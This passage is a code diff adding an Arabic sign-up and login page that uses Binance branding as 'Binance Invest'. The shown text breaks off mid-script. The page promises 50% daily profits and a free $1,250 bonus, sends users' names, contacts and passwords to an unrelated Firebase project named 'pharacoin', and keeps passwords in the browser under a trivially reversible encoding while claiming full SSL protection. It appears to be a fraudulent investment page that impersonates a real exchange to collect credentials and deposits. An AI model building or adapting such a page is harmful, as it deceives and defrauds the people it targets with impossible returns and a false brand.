@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>Binance Invest • سجل الآن</title>
+    <meta name="description" content="سجل في Binance Invest وابدأ ربح 50% يومياً. خطط مرنة تبدأ من 10$." />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root {
+            --bg-deep: #070b1a;
+            --card-bg-transparent: rgba(20, 30, 60, 0.04);
+            --card-bg-opaque: rgba(15, 25, 55, 0.75);
+            --gold: #f3ba2f;
+            --gold-light: #fcd970;
+            --gold-dark: #b8871e;
+            --text: #ffffff;
+            --text-dim: #e8ecf5;
+            --text-muted: #a0a8c0;
+            --border-light: rgba(255, 255, 255, 0.06);
+            --radius-xl: 28px;
+            --radius-lg: 20px;
+            --transition: 0.3s cubic-bezier(0.23, 1, 0.32, 1);
+            --green: #22c55e;
+            --red: #ef4444;
+            --yellow: #f59e0b;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-deep);
+            color: var(--text);
+            line-height: 1.7;
+            direction: rtl;
+            position: relative;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .splash-overlay {
+            position: fixed; inset: 0; z-index: 9999;
+            background: radial-gradient(circle at center, #0a1128 0%, #03050d 100%);
+            display: flex; align-items: center; justify-content: center;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+        .splash-overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        .splash-particles { position: absolute; inset: 0; pointer-events: none; }
+        .splash-particle {
+            position: absolute; background: var(--gold); border-radius: 50%;
+            filter: blur(1px); animation: floatParticle 4s infinite ease-in-out; opacity: 0.4;
+        }
+        @keyframes floatParticle {
+            0% { transform: translateY(0) scale(0.8); opacity: 0.2; }
+            50% { opacity: 0.7; transform: translateY(-30px) scale(1.2); }
+            100% { transform: translateY(0) scale(0.8); opacity: 0.2; }
+        }
+        .splash-container { text-align: center; z-index: 10; animation: fadeIn 0.8s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .logo-wrapper { display: inline-block; position: relative; margin-bottom: 30px; }
+        .logo-glow {
+            position: absolute; width: 120px; height: 120px;
+            background: radial-gradient(circle, rgba(243,186,47,0.6) 0%, transparent 70%);
+            top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: 50%;
+            filter: blur(25px); animation: pulseGlow 2s infinite;
+        }
+        @keyframes pulseGlow { 0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; } 50% { transform: translate(-50%, -50%) scale(1.3); opacity: 1; } }
+        .logo-hex {
+            width: 100px; height: 100px; background: rgba(243,186,47,0.1);
+            border: 3px solid var(--gold); border-radius: 20px; transform: rotate(45deg);
+            display: flex; align-items: center; justify-content: center; margin: 0 auto;
+            position: relative; z-index: 2; box-shadow: 0 0 30px rgba(243,186,47,0.4);
+            animation: rotateLogo 3s infinite linear;
+        }
+        @keyframes rotateLogo { 0% { transform: rotate(45deg); } 100% { transform: rotate(405deg); } }
+        .logo-hex img { width: 70%; height: 70%; object-fit: contain; transform: rotate(-45deg); animation: counterRotate 3s linear infinite; }
+        @keyframes counterRotate { 0% { transform: rotate(-45deg); } 100% { transform: rotate(315deg); } }
+        .brand-name { font-size: 36px; font-weight: 900; color: var(--gold); letter-spacing: 2px; margin-top: 20px; text-shadow: 0 0 25px rgba(243,186,47,0.6); }
+        .tagline { color: #b0c0e0; font-size: 16px; margin-top: 5px; opacity: 0.9; }
+        .loading-bar { width: 240px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; margin: 30px auto 0; overflow: hidden; }
+        .loading-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--gold-dark), var(--gold), var(--gold-light)); border-radius: 10px; animation: fillBar 2.5s ease-in-out forwards; box-shadow: 0 0 20px rgba(243,186,47,0.7); }
+        @keyframes fillBar { from { width: 0%; } to { width: 100%; } }
+        .loading-text { color: #b0c0e0; font-size: 13px; margin-top: 8px; opacity: 0.8; }
+
+        body::before {
+            content: '';
+            position: fixed; inset: 0;
+            background: url('qe.png') center/cover no-repeat;
+            z-index: -3; opacity: 1; filter: brightness(1.2) saturate(1.1);
+        }
+        body::after {
+            content: '';
+            position: fixed; inset: 0;
+            background: radial-gradient(ellipse at 20% 30%, rgba(10, 17, 40, 0.03) 0%, transparent 50%),
+                        radial-gradient(ellipse at 80% 70%, rgba(10, 17, 40, 0.05) 0%, transparent 70%),
+                        linear-gradient(180deg, rgba(7, 11, 26, 0.05) 0%, rgba(7, 11, 26, 0.1) 100%);
+            z-index: -2; backdrop-filter: none;
+        }
+
+        .main-container { width: 100%; max-width: 480px; margin: 0 auto; padding: 20px; z-index: 1; animation: fadeUp 0.8s ease; }
+        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(40px); } 100% { opacity: 1; transform: translateY(0); } }
+        .logo-top { text-align: center; margin-bottom: 20px; }
+        .logo-top .icon {
+            width: 50px; height: 50px; border-radius: 12px; background: rgba(243, 186, 47, 0.15);
+            border: 1px solid rgba(243, 186, 47, 0.5); overflow: hidden; display: inline-flex;
+            align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(243,186,47,0.3);
+        }
+        .logo-top .icon img { width: 100%; height: 100%; object-fit: cover; }
+
+        .bonus-banner {
+            position: relative;
+            background: linear-gradient(135deg, rgba(243,186,47,0.2), rgba(243,186,47,0.08));
+            border: 2px dashed rgba(243,186,47,0.6);
+            border-radius: 16px;
+            padding: 12px 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            overflow: hidden;
+            animation: bannerBounce 3s ease-in-out infinite;
+            cursor: pointer;
+        }
+
+        @keyframes bannerBounce {
+            0%, 100% { transform: translateY(0); box-shadow: 0 0 15px rgba(243,186,47,0.2); }
+            50% { transform: translateY(-4px); box-shadow: 0 8px 25px rgba(243,186,47,0.4); }
+        }
+
+        .bonus-banner::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
+        .bonus-banner .gift-icon {
+            font-size: 26px;
+            animation: giftShake 2s infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes giftShake {
+            0%, 100% { transform: rotate(0deg); }
+            10%, 30% { transform: rotate(-12deg); }
+            20%, 40% { transform: rotate(12deg); }
+            50% { transform: rotate(0deg); }
+        }
+
+        .bonus-banner .bonus-text {
+            font-weight: 800;
+            font-size: 14px;
+            color: var(--gold-light);
+            text-shadow: 0 0 15px rgba(243,186,47,0.5);
+            position: relative;
+            z-index: 1;
+        }
+
+        .bonus-banner .bonus-amount {
+            color: var(--gold);
+            font-size: 20px;
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(243,186,47,0.8);
+            direction: ltr;
+            display: inline-block;
+        }
+
+        .tab-buttons { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab-btn {
+            flex: 1; padding: 14px; border-radius: 16px; border: 1px solid rgba(243,186,47,0.3);
+            background: rgba(15,25,50,0.2); backdrop-filter: blur(15px);
+            color: var(--text-dim); font-weight: 700; font-size: 15px;
+            cursor: pointer; font-family: inherit; transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+        .tab-btn.active {
+            background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dark) 100%);
+            color: #0a0f1e; border-color: var(--gold); box-shadow: 0 10px 25px rgba(243,186,47,0.4);
+        }
+
+        .register-card {
+            background: var(--card-bg-transparent);
+            backdrop-filter: blur(2px);
+            border: 1px solid rgba(243, 186, 47, 0.15);
+            border-radius: var(--radius-xl); padding: 32px 28px;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.2);
+            text-align: center; margin-bottom: 20px; display: none;
+            text-shadow: 0 0 15px rgba(0,0,0,0.9);
+            transition: background 0.5s ease, backdrop-filter 0.5s ease, border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        .register-card.active { display: block; }
+        .register-card.card-filled {
+            background: var(--card-bg-opaque);
+            backdrop-filter: blur(20px);
+            border-color: rgba(243, 186, 47, 0.5);
+            box-shadow: 0 25px 50px -15px rgba(0,0,0,0.6), 0 0 0 1px rgba(243,186,47,0.2) inset;
+        }
+
+        .register-card h2 { font-size: 26px; font-weight: 900; margin-bottom: 4px; color: var(--text); }
+        .register-card .gold { color: var(--gold); text-shadow: 0 0 15px rgba(243,186,47,0.4); }
+        .register-card .sub { color: var(--text-dim); font-size: 13px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 16px; text-align: right; position: relative; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text-dim); margin-bottom: 5px; }
+        .form-group input {
+            width: 100%; padding: 13px 40px 13px 14px; border-radius: 12px;
+            border: 1px solid rgba(243, 186, 47, 0.35); background: rgba(0,0,0,0.2);
+            color: var(--text); font-family: inherit; font-size: 14px; outline: none; transition: all 0.3s;
+        }
+        .form-group input:focus { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(243,186,47,0.2); }
+        .form-group input::placeholder { color: rgba(255,255,255,0.25); }
+        .input-hint { font-size: 10px; color: var(--text-dim); margin-top: 3px; text-align: right; transition: color 0.3s; }
+        .password-toggle {
+            position: absolute; left: 12px; top: 38px; background: none; border: none;
+            color: var(--text-muted); cursor: pointer; font-size: 18px; padding: 4px;
+            line-height: 1; z-index: 2; transition: color 0.2s;
+        }
+        .password-toggle:hover { color: var(--gold); }
+
+        .contact-type-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .contact-type-tab {
+            flex: 1;
+            padding: 8px 12px;
+            border-radius: 10px;
+            border: 1.5px solid rgba(243,186,47,0.25);
+            background: rgba(0,0,0,0.15);
+            color: var(--text-muted);
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .contact-type-tab:hover {
+            border-color: rgba(243,186,47,0.5);
+            color: var(--gold-light);
+        }
+
+        .contact-type-tab.active {
+            background: linear-gradient(135deg, rgba(243,186,47,0.9), rgba(184,135,30,0.9));
+            border-color: var(--gold);
+            color: #0a0f1e;
+            box-shadow: 0 4px 12px rgba(243,186,47,0.4);
+        }
+
+        /* ========== 🗑️ شريط البيانات المحفوظة ========== */
+        .saved-credentials-bar {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            font-size: 12px;
+            color: #4ade80;
+        }
+        .saved-credentials-bar.show {
+            display: flex;
+        }
+        .saved-credentials-bar .info {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .saved-credentials-bar .clear-btn {
+            background: rgba(239,68,68,0.15);
+            border: 1px solid rgba(239,68,68,0.4);
+            color: #fca5a5;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-family: inherit;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .saved-credentials-bar .clear-btn:hover {
+            background: rgba(239,68,68,0.3);
+        }
+
+        .password-strength {
+            margin-top: 8px;
+            display: none;
+        }
+
+        .password-strength.show { display: block; }
+
+        .strength-bars {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 6px;
+        }
+
+        .strength-bars .bar {
+            flex: 1;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .strength-bars .bar.active.weak { background: var(--red); box-shadow: 0 0 8px var(--red); }
+        .strength-bars .bar.active.medium { background: var(--yellow); box-shadow: 0 0 8px var(--yellow); }
+        .strength-bars .bar.active.strong { background: var(--green); box-shadow: 0 0 8px var(--green); }
+
+        .strength-text {
+            font-size: 11px;
+            font-weight: 700;
+            text-align: right;
+        }
+
+        .strength-text.weak { color: var(--red); }
+        .strength-text.medium { color: var(--yellow); }
+        .strength-text.strong { color: var(--green); }
+
+        .strength-hints {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 6px;
+            font-size: 10px;
+        }
+
+        .strength-hints span {
+            padding: 2px 8px;
+            border-radius: 6px;
+            background: rgba(255,255,255,0.05);
+            color: var(--text-muted);
+            transition: all 0.2s;
+        }
+
+        .strength-hints span.valid {
+            background: rgba(34,197,94,0.15);
+            color: var(--green);
+        }
+
+        .btn-submit {
+            width: 100%; background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dark) 100%);
+            color: #0a0f1e; font-weight: 800; padding: 14px; border-radius: 14px; border: none;
+            cursor: pointer; font-family: inherit; font-size: 16px; letter-spacing: 0.3px;
+            box-shadow: 0 10px 25px rgba(243, 186, 47, 0.4); transition: all 0.3s; margin-top: 4px;
+        }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .btn-submit:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(243, 186, 47, 0.6); }
+
+        .secure-note { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 14px; font-size: 11px; color: var(--text-dim); }
+        .error-message { background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.5); color: #fca5a5; padding: 10px; border-radius: 12px; font-size: 13px; margin-bottom: 16px; display: none; }
+
+        .captcha-box {
+            display: flex; align-items: center; gap: 10px; margin: 12px 0;
+            background: transparent; border-radius: 10px; padding: 0;
+        }
+        .captcha-question { color: var(--gold); font-weight: 700; font-size: 16px; white-space: nowrap; }
+        .captcha-box input {
+            flex: 1; padding: 13px 14px; border-radius: 12px;
+            border: 1px solid rgba(243, 186, 47, 0.35); background: rgba(0,0,0,0.2);
+            color: var(--text); font-family: inherit; font-size: 14px; outline: none; transition: all 0.3s;
+        }
+        .captcha-box input:focus { border-color: var(--gold); box-shadow: 0 0 0 3px rgba(243,186,47,0.2); }
+
+        .agree-group {
+            display: flex; align-items: center; gap: 10px; text-align: right;
+            font-size: 13px; color: var(--text-dim); margin: 16px 0;
+        }
+        .custom-checkbox {
+            width: 22px; height: 22px; border: 2px solid rgba(243,186,47,0.5);
+            border-radius: 6px; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.2s; flex-shrink: 0;
+            background: rgba(0,0,0,0.2);
+        }
+        .custom-checkbox.checked {
+            background: var(--gold); border-color: var(--gold);
+            box-shadow: 0 0 10px rgba(243,186,47,0.4);
+        }
+        .custom-checkbox::after {
+            content: '✓'; color: #0a0f1e; font-weight: 900; font-size: 14px;
+            opacity: 0; transform: scale(0.5); transition: all 0.2s;
+        }
+        .custom-checkbox.checked::after { opacity: 1; transform: scale(1); }
+        .agree-group a { color: var(--gold); text-decoration: underline; font-weight: 600; }
+        .agree-group a:hover { color: var(--gold-light); }
+
+        .benefits {
+            background: rgba(15, 25, 50, 0.1); backdrop-filter: blur(10px);
+            border: 1px solid rgba(243, 186, 47, 0.2); border-radius: 20px;
+            padding: 20px; text-align: center; margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(0,0,0,0.8);
+        }
+        .benefits h3 { font-size: 18px; font-weight: 800; color: var(--gold); margin-bottom: 12px; }
+        .benefits-list { display: flex; justify-content: space-around; gap: 12px; flex-wrap: wrap; }
+        .benefit-item { flex: 1; min-width: 100px; text-align: center; }
+        .benefit-icon { font-size: 28px; margin-bottom: 4px; }
+        .benefit-text { font-size: 12px; color: var(--text-dim); font-weight: 500; }
+
+        .back-link { text-align: center; font-size: 12px; color: var(--text-dim); margin-top: 8px; }
+        .back-link a { color: var(--gold); text-decoration: none; font-weight: 600; }
+        .back-link a:hover { text-decoration: underline; }
+
+        @media (max-width: 480px) {
+            .register-card { padding: 24px 18px; }
+            .main-container { padding: 12px; }
+            .benefits-list { flex-direction: column; align-items: center; }
+            .bonus-banner { padding: 10px 14px; font-size: 12px; }
+            .bonus-banner .bonus-amount { font-size: 17px; }
+            .bonus-banner .gift-icon { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="splash-overlay" id="splashOverlay">
+        <div class="splash-particles" id="splashParticles"></div>
+        <div class="splash-container" id="splashContent">
+            <div class="logo-wrapper">
+                <div class="logo-glow"></div>
+                <div class="logo-hex"><img src="qa.png" alt="Binance Logo"></div>
+            </div>
+            <div class="brand-name">BINANCE INVEST</div>
+            <div class="tagline">استثمر بذكاء • اربح بقوة</div>
+            <div class="loading-bar"><div class="loading-fill"></div></div>
+            <div class="loading-text">جاري تحميل المنصة...</div>
+        </div>
+    </div>
+
+    <div class="main-container" id="mainContent">
+        <div class="logo-top">
+            <div class="icon"><img src="qa.png" alt="Binance" /></div>
+        </div>
+
+        <div class="bonus-banner" id="bonusBanner" onclick="highlightSignup()">
+            <span class="gift-icon">🎁</span>
+            <span class="bonus-text">
+                احصل على <span class="bonus-amount">$1,250</span> مجاناً عند تسجيلك!
+            </span>
+        </div>
+
+        <div class="tab-buttons">
+            <button class="tab-btn active" id="tabSignup" onclick="switchTab('signup')">📝 إنشاء حساب</button>
+            <button class="tab-btn" id="tabLogin" onclick="switchTab('login')">🔑 تسجيل الدخول</button>
+        </div>
+
+        <!-- نموذج التسجيل -->
+        <div class="register-card active" id="cardSignup">
+            <h2>إنشاء حساب <span class="gold">جديد</span></h2>
+            <p class="sub">أدخل بياناتك للانضمام إلى منصة Binance Invest</p>
+            <div class="error-message" id="errorSignup"></div>
+            <form id="signupForm">
+                <div class="form-group">
+                    <label>الاسم الكامل</label>
+                    <input type="text" id="signupFullName" placeholder="محمد أحمد" required oninput="checkCardInputs('cardSignup')" />
+                </div>
+
+                <div class="form-group">
+                    <label>طريقة التواصل</label>
+                    <div class="contact-type-tabs">
+                        <button type="button" class="contact-type-tab active" data-type="email" onclick="selectContactType('email', 'signup')">
+                            📧 بريد إلكتروني
+                        </button>
+                        <button type="button" class="contact-type-tab" data-type="phone" onclick="selectContactType('phone', 'signup')">
+                            📱 رقم الهاتف
+                        </button>
+                    </div>
+                    <input 
+                        type="text" 
+                        id="signupContact" 
+                        placeholder="example@email.com" 
+                        required 
+                        oninput="checkCardInputs('cardSignup')" 
+                    />
+                    <div class="input-hint" id="signupContactHint">أدخل بريدك الإلكتروني</div>
+                </div>
+
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input 
+                        type="password" 
+                        id="signupPassword" 
+                        placeholder="••••••••" 
+                        required 
+                        oninput="onPasswordInput('signupPassword')" 
+                    />
+                    <button type="button" class="password-toggle" onclick="togglePassword('signupPassword', this)">👁️</button>
+
+                    <div class="password-strength" id="passwordStrength">
+                        <div class="strength-bars">
+                            <div class="bar" id="bar1"></div>
+                            <div class="bar" id="bar2"></div>
+                            <div class="bar" id="bar3"></div>
+                            <div class="bar" id="bar4"></div>
+                        </div>
+                        <div class="strength-text" id="strengthText">كلمة مرور ضعيفة</div>
+                        <div class="strength-hints">
+                            <span id="hintLength">8+ أحرف</span>
+                            <span id="hintUpper">حرف كبير</span>
+                            <span id="hintNumber">رقم</span>
+                            <span id="hintSymbol">رمز</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>تأكيد كلمة المرور</label>
+                    <input type="password" id="signupConfirmPassword" placeholder="••••••••" required minlength="6" oninput="checkCardInputs('cardSignup')" />
+                    <button type="button" class="password-toggle" onclick="togglePassword('signupConfirmPassword', this)">👁️</button>
+                </div>
+
+                <div class="captcha-box">
+                    <span class="captcha-question" id="signupCaptchaQuestion"></span>
+                    <input type="text" id="signupCaptchaInput" placeholder="الإجابة" required oninput="checkCardInputs('cardSignup')" />
+                </div>
+
+                <div class="agree-group" id="signupAgreeGroup">
+                    <div class="custom-checkbox" id="signupAgreeCheck" onclick="toggleCheck(this)"></div>
+                    <label>
+                        أوافق على <a href="terms.html" target="_blank">الشروط</a> و <a href="privacy.html" target="_blank">سياسة الخصوصية</a>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-submit" id="signupBtn">🚀 سجل الآن</button>
+                <div class="secure-note">🔒 بياناتك محمية بتشفير SSL كامل</div>
+            </form>
+        </div>
+
+        <!-- نموذج تسجيل الدخول -->
+        <div class="register-card" id="cardLogin">
+            <h2>تسجيل <span class="gold">الدخول</span></h2>
+            <p class="sub">أدخل بياناتك للوصول إلى حسابك</p>
+            <div class="error-message" id="errorLogin"></div>
+            
+            <!-- 🗑️ شريط البيانات المحفوظة -->
+            <div class="saved-credentials-bar" id="savedCredentialsBar">
+                <span class="info">✅ <span id="savedContactText"></span></span>
+                <button type="button" class="clear-btn" onclick="clearSavedCredentials()">🗑️ مسح</button>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="loginContact" placeholder="example@email.com أو 01xxxxxxxxx" required oninput="checkCardInputs('cardLogin')" />
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="loginPassword" placeholder="••••••••" required minlength="6" oninput="checkCardInputs('cardLogin')" />
+                    <button type="button" class="password-toggle" onclick="togglePassword('loginPassword', this)">👁️</button>
+                </div>
+
+                <div class="captcha-box">
+                    <span class="captcha-question" id="loginCaptchaQuestion"></span>
+                    <input type="text" id="loginCaptchaInput" placeholder="الإجابة" required oninput="checkCardInputs('cardLogin')" />
+                </div>
+
+                <div class="agree-group" id="loginAgreeGroup">
+                    <div class="custom-checkbox" id="loginAgreeCheck" onclick="toggleCheck(this)"></div>
+                    <label>
+                        أوافق على <a href="terms.html" target="_blank">الشروط</a> و <a href="privacy.html" target="_blank">سياسة الخصوصية</a>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-submit" id="loginBtn">🔓 تسجيل الدخول</button>
+                <div class="secure-note">🔒 بياناتك محمية بتشفير SSL كامل</div>
+            </form>
+        </div>
+
+        <div class="benefits">
+            <h3>مميزات بعد التسجيل</h3>
+            <div class="benefits-list">
+                <div class="benefit-item"><div class="benefit-icon">💰</div><div class="benefit-text">أرباح يومية تصل إلى 50%</div></div>
+                <div class="benefit-item"><div class="benefit-icon">⚡</div><div class="benefit-text">سحب فوري خلال 24 ساعة</div></div>
+                <div class="benefit-item"><div class="benefit-icon">🔒</div><div class="benefit-text">حماية وأمان كاملين</div></div>
+                <div class="benefit-item"><div class="benefit-icon">🎯</div><div class="benefit-text">خطط استثمارية مرنة</div></div>
+            </div>
+        </div>
+
+        <div class="back-link"><a href="index.html">← العودة للصفحة الرئيسية</a></div>
+    </div>
+
+    <script>
+        // Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyB78JT_cbPMizvzKWBrQoQUe3-zukHrr1U",
+            authDomain: "pharacoin.firebaseapp.com",
+            projectId: "pharacoin",
+            storageBucket: "pharacoin.firebasestorage.app",
+            messagingSenderId: "1047668783635",
+            appId: "1:1047668783635:web:10673630ede69c60181de6",
+            measurementId: "G-06CG470MPX"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // ========== 🔑 مفاتيح حفظ البيانات ==========
+        const STORAGE_KEYS = {
+            SAVED_CONTACT: 'binance_saved_contact',
+            SAVED_PASSWORD: 'binance_saved_password'
+        };
+
+        // 🔒 تشفير/فك تشفير بسيط لكلمة المرور (Base64 + عكس)
+        function encodePass(pass) {
+            try {
+                return btoa(unescape(encodeURIComponent(pass.split('').reverse().join(''))));
+            } catch (e) {
+                return pass;
+            }
+        }
+        function decodePass(encoded) {
+            try {
+                return decodeURIComponent(escape(atob(encoded))).split('').reverse().join('');
+            } catch (e) {
+                return '';
+            }
+        }
+
+        // ========== 🎬 Splash Screen ==========
+        const SPLASH_KEY = 'signup_splash_shown';
+
+        // ========== 💾 حفظ البيانات تلقائياً (بدون تسجيل دخول تلقائي) ==========
+        function saveCredentialsAuto(contact, password) {
+            if (!contact || !password) return;
+            try {
+                localStorage.setItem(STORAGE_KEYS.SAVED_CONTACT, contact);
+                localStorage.setItem(STORAGE_KEYS.SAVED_PASSWORD, encodePass(password));
+                console.log('✅ تم حفظ البيانات تلقائياً');
+            } catch (e) {
+                console.log('خطأ في حفظ البيانات:', e);
+            }
+        }
+
+        // ========== 💾 استرجاع البيانات لتعبئة النموذج فقط ==========
+        function restoreSavedCredentials() {
+            const savedContact = localStorage.getItem(STORAGE_KEYS.SAVED_CONTACT);
+            const savedPassword = localStorage.getItem(STORAGE_KEYS.SAVED_PASSWORD);
+
+            if (savedContact && savedPassword) {
+                // إظهار شريط البيانات المحفوظة
+                document.getElementById('savedCredentialsBar').classList.add('show');
+                document.getElementById('savedContactText').textContent = savedContact;
+
+                // تعبئة الحقول (لكن لا نضغط زر الدخول تلقائياً!)
+                const contactInput = document.getElementById('loginContact');
+                const passwordInput = document.getElementById('loginPassword');
+                
+                contactInput.value = savedContact;
+                passwordInput.value = decodePass(savedPassword);
+
+                // التبديل لنموذج تسجيل الدخول تلقائياً
+                setTimeout(() => {
+                    switchTab('login');
+                    checkCardInputs('cardLogin');
+                }, 100);
+            }
+        }
+
+        // ========== 🗑️ مسح البيانات المحفوظة ==========
+        function clearSavedCredentials() {
+            localStorage.removeItem(STORAGE_KEYS.SAVED_CONTACT);
+            localStorage.removeItem(STORAGE_KEYS.SAVED_PASSWORD);
+            
+            document.getElementById('savedCredentialsBar').classList.remove('show');
+            
+            document.getElementById('loginContact').value = '';
+            document.getElementById('loginPassword').value = '';
+            checkCardInputs('cardLogin');
+
+            showToast('🗑️ تم مسح البيانات المحفوظة');
+        }
+        window.clearSavedCredentials = clearSavedCredentials;
+
+        // ========== 🎬 Splash Screen Initialization ==========
+        function showSplash() {
+            const splashParticles = document.getElementById('splashParticles');
+            for (let i = 0; i < 25; i++) {
+                const p = document.createElement('div'); p.classList.add('splash-particle');
+                const size = Math.random() * 5 + 2;
+                p.style.width = size + 'px'; p.style.height = size + 'px';
+                p.style.left = Math.random() * 100 + '%'; p.style.top = Math.random() * 100 + '%';
+                p.style.animationDelay = Math.random() * 3 + 's';
+                splashParticles.appendChild(p);
+            }
+            document.getElementById('splashOverlay').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('splashOverlay').classList.add('hidden');
+                document.getElementById('mainContent').style.opacity = '1';
+            }, 2600);
+        }
+
+        // ========== ⚙️ تهيئة الصفحة ==========
+        window.addEventListener('load', () => {
+            // Splash
+            if (!sessionStorage.getItem(SPLASH_KEY)) {
+                showSplash();
+                sessionStorage.setItem(SPLASH_KEY, 'true');
+            } else {
+                document.getElementById('splashOverlay').classList.add('hidden');
+                document.getElementById('mainContent').style.opacity = '1';
+            }
+            document.getElementById('mainContent').style.opacity = '0';
+            document.getElementById('mainContent').style.transition = 'opacity 0.6s ease';
+
+            // استرجاع البيانات المحفوظة لتعبئة النموذج فقط (بدون تسجيل دخول!)
+            restoreSavedCredentials();
+
+            checkCardInputs('cardSignup');
+            checkCardInputs('cardLogin');
+        });
+
+        // ========== 🍞 Toast ==========
+        function showToast(msg) {
+            const existing = document.querySelector('.custom-toast');
+            if (existing) existing.remove();
+
+            const toast = document.createElement('div');
+            toast.className = 'custom-toast';
+            toast.style.cssText = `
+                position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+                background: rgba(20, 30, 60, 0.95); backdrop-filter: blur(20px);
+                border: 1px solid var(--gold); color: var(--gold);
+                padding: 14px 28px; border-radius: 50px; font-weight: 700;
+                z-index: 99999; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+                font-family: Cairo, sans-serif; font-size: 14px;
+                animation: slideUp 0.4s ease;
+            `;
+            toast.textContent = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        // ========== باقي الكود ==========
+        let currentContactType = 'email';
+
+        function selectContactType(type, form) {
+            currentContactType = type;
+            const tabs = document.querySelectorAll(`#card${form.charAt(0).toUpperCase() + form.slice(1)} .contact-type-tab`);
+            tabs.forEach(tab => {
+                tab.classList.toggle('active', tab.dataset.type === type);
+            });
+            const contactInput = document.getElementById(`${form}Contact`);
+            const contactHint = document.getElementById(`${form}ContactHint`);
+            if (type === 'email') {
+                contactInput.placeholder = 'example@email.com';
+                contactInput.setAttribute('inputmode', 'email');
+                if (contactHint) contactHint.textContent = 'أدخل بريدك الإلكتروني';
+            } else {
+                contactInput.placeholder = '01xxxxxxxxx';
+                contactInput.setAttribute('inputmode', 'tel');
+                if (contactHint) contactHint.textContent = 'أدخل رقم هاتفك';
+            }
+            contactInput.value = '';
+            if (contactHint) contactHint.style.color = 'var(--text-dim)';
+        }
+
+        function evaluatePassword(password) {
+            const checks = {
+                length: password.length >= 8,
+                upper: /[A-Z]/.test(password),
+                number: /[0-9]/.test(password),
+                symbol: /[^A-Za-z0-9]/.test(password)
+            };
+            let score = 0;
+            if (password.length >= 6) score++;
